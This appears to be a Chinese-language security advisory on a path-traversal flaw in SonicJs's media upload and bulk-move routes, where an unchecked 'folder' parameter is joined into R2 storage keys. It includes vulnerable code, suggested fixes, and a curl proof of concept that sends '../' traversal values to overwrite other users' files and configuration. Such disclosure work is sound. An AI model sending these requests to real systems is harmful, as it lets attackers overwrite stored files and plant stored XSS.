# SONIC-2025-002: Media Upload R2 Key 路径穿越

## 基本信息

| 字段 | 值 |
|------|-----|
| **项目** | [SonicJs-Org/sonicjs](https://github.com/SonicJs-Org/sonicjs) |
| **版本** | main branch (截至 2026-05-19) |
| **严重性** | High |
| **CVSS 3.1** | 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H) |
| **CWE** | CWE-22 (Improper Limitation of a Pathname to a Restricted Directory) |
| **发现日期** | 2026-05-19 |
| **攻击向量** | 网络/需要认证（任何注册用户） |

## 漏洞概述

SonicJs 的 Media Upload API (`/api/media/upload`) 允许认证用户通过 `folder` 参数控制文件在 R2 存储中的存放路径。该参数直接拼接到 R2 object key 中，无任何路径校验或过滤。攻击者可以：

1. 使用 `../` 前缀将文件写入预期目录之外的位置
2. 覆盖其他用户上传的文件
3. 覆盖系统配置文件（如 Cloudflare Pages 的 `_headers`、`_redirects`）
4. 通过 bulk-move 功能实现类似效果

## 漏洞代码

**文件**: `packages/core/src/routes/api-media.ts` (第74-78行)

```typescript
// Upload single file
apiMediaRoutes.post('/upload', async (c) => {
  // ...
  const folder = formData.get('folder') as string || 'uploads'
  const r2Key = `${folder}/${filename}`  // ⚠️ 直接拼接，无校验

  // Upload to R2
  const arrayBuffer = await file.arrayBuffer()
  const uploadResult = await c.env.MEDIA_BUCKET.put(r2Key, arrayBuffer, {
    httpMetadata: { contentType: file.type, ... }
  })
```

**对比 `create-folder` 路由**（第371-382行）有校验但 upload 没有：
```typescript
// create-folder 有校验
const folderPattern = /^[a-z0-9-_]+$/
if (!folderPattern.test(folderName)) {
  return c.json({ error: '...' }, 400)
}
// ← 但 upload 路由的 folder 参数完全没有这个检查！
```

## PoC (概念验证)

```bash
# 前提：攻击者已注册并获取 JWT token
TOKEN="eyJ..."

# 攻击1：路径穿越写入 bucket 根目录
curl -X POST https://target.workers.dev/api/media/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@malicious.html" \
  -F "folder=../../"
# R2 key 变成: ../../<uuid>.html

# 攻击2：覆盖其他用户的文件夹
curl -X POST https://target.workers.dev/api/media/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@evil.png" \
  -F "folder=../other-user-folder"

# 攻击3：尝试写入 Cloudflare Pages 配置
curl -X POST https://target.workers.dev/api/media/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@_headers" \
  -F "folder=../../"

# bulk-move 也有同样问题
curl -X POST https://target.workers.dev/api/media/bulk-move \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"fileIds":["<file-id>"],"folder":"../../system"}'
```

## 影响

- 覆盖 R2 bucket 中其他用户的文件
- 可能污染前端静态资源（如果 R2 bucket 同时服务静态内容）
- 存储型 XSS（如果上传的 HTML 文件可通过 public URL 访问）

## 修复建议

```typescript
// 在 upload 和 bulk-move 路由中添加 folder 校验
function sanitizeFolder(folder: string): string {
  // 只允许安全字符，阻止路径穿越
  const sanitized = folder
    .replace(/\.\./g, '')           // 移除 ..
    .replace(/^\/+/, '')            // 移除前导 /
    .replace(/[^a-z0-9\-_\/]/gi, '') // 只保留安全字符
    .replace(/\/+/g, '/')           // 合并多个 /
    .replace(/\/$/, '')             // 移除尾部 /
  
  return sanitized || 'uploads'
}

// 或者直接复用 create-folder 的正则
const SAFE_FOLDER_REGEX = /^[a-z0-9\-_]+(\/[a-z0-9\-_]+)*$/
if (!SAFE_FOLDER_REGEX.test(folder)) {
  return c.json({ error: 'Invalid folder name' }, 400)
}
```

## 参考

- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [Cloudflare R2 Object Key Documentation](https://developers.cloudflare.com/r2/api/workers/workers-api-usage/)
